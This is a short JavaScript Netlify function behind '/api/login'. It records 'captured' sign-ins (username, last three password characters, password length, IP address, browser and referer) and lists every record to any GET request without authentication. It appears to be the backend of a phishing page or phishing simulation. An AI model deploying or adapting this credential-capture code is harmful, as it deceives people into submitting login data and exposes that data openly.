import { getStore } from '@netlify/blobs';

const json = (data, status = 200) =>
  new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
  });

export default async (req) => {
  const store = getStore({ name: 'logins', consistency: 'strong' });

  /* ---- Read every captured sign-in ---- */
  if (req.method === 'GET') {
    const { blobs } = await store.list();
    const records = await Promise.all(
      blobs.map((b) => store.get(b.key, { type: 'json' }).catch(() => null))
    );
    records.sort((a, b) => (b?.ts ?? 0) - (a?.ts ?? 0));
    return json({ count: records.length, records });
  }

  if (req.method !== 'POST') {
    return json({ error: 'Method not allowed' }, 405);
  }

  /* ---- Capture one sign-in ---- */
  let body = {};
  try {
    body = await req.json();
  } catch {
    /* ignore malformed body */
  }

  const ip =
    req.headers.get('x-nf-client-connection-ip') ||
    (req.headers.get('x-forwarded-for') || '').split(',')[0].trim() ||
    'unknown';

  const ts = Date.now();
  const record = {
    username: String(body.username ?? '').slice(0, 320),
    passwordLast3: String(body.passwordLast3 ?? '').slice(0, 3),
    passwordLength: Number.isFinite(body.passwordLength) ? body.passwordLength : null,
    ip,
    userAgent: req.headers.get('user-agent') || '',
    referer: req.headers.get('referer') || '',
    ts,
    time: new Date(ts).toISOString(),
  };

  const key = `${ts}-${Math.random().toString(36).slice(2, 8)}`;
  await store.setJSON(key, record);

  return json({ ok: true, key, record }, 201);
};

export const config = { path: '/api/login' };